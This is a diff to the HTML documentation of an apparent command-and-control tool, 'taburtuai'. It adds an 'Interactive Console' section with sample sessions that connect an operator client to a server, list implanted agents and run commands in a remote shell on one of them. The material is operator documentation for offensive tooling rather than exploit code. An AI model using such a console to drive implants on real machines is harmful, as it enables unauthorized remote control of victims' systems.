@@ -436,6 +436,7 @@
   <a href="#global-flags">Global Flags</a>
 
   <div class="nav-section">Commands</div>
+  <a href="#console"><span class="cmd-label">console</span></a>
   <a href="#agents"><span class="cmd-label">agents</span></a>
   <a href="#shell"><span class="cmd-label">shell</span></a>
   <a href="#cmd"><span class="cmd-label">cmd</span></a>
@@ -591,6 +592,43 @@ export TABURTUAI_API_KEY=<span class="string">your_secret_token</span>
       <div class="cmd-block-body">
         <p>Removes the agent record from the server database. Does <strong>not</strong> terminate the running implant on the target.</p>
         <pre><span class="cmd">operator</span> agents delete 7d019eb7</pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- Interactive Console -->
+  <section id="console">
+    <div class="section-header">
+      <div class="section-num">★</div>
+      <h2>Interactive Console</h2>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-block-header">
+        <code>console</code>
+        <span class="desc">Metasploit-style interactive session</span>
+      </div>
+      <div class="cmd-block-body">
+        <p>Set the server once on entry — no need to repeat <code>--server</code> on every command. Supports arrow keys, command history (<code>↑</code>/<code>↓</code>), and <code>Ctrl+R</code> search.</p>
+        <pre><span class="cmd">operator</span> <span class="flag">--server</span> <span class="string">http://172.23.0.118:9000</span> console</pre>
+        <pre><span class="prompt">  [*] Connected to http://172.23.0.118:9000
+  [*] Type help for commands, exit to quit.
+
+</span><span class="prompt">taburtuai(172.23.0.118:9000) › </span><span class="cmd">agents list</span>
+<span class="output">  [+] Found 3 agent(s) ...</span>
+
+<span class="prompt">taburtuai(172.23.0.118:9000) › </span><span class="cmd">shell 7d019eb7</span>
+<span class="prompt">  shell  7d019eb7  · exit to quit
+
+[7d019eb7] › </span><span class="cmd">whoami</span>
+<span class="output">blackout\nurkh</span>
+<span class="prompt">[7d019eb7] › </span>exit
+
+<span class="prompt">taburtuai(172.23.0.118:9000) › </span>exit</pre>
+        <div class="callout callout-tip">
+          <span class="callout-icon">💡</span>
+          <span>Command history is saved to <code>/tmp/.taburtuai_history</code> and persists between console sessions.</span>
+        </div>
       </div>
     </div>
   </section>
